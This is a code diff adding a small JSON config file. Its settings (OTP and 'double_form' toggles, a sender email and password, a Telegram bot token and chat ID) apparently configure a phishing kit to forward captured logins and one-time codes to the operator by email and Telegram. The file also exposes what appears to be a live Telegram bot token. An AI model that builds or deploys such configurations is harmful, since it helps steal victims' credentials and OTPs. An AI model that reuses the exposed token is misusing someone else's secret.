@@ -1,0 +1,10 @@
+{
+  "otp": "OFF",
+  "double_form": "OFF",
+  "email_target": "email@target.com",
+  "host":"gmail",
+  "email_sender": "email@gmail.com",
+  "email_pass": "yourpassword",
+  "telegram_token": "6357080171:AAG8McTbMCuCGrN6W-tDrLftORJ-lw6xfEc",
+  "telegram_chat_id": "5086309153"
+}
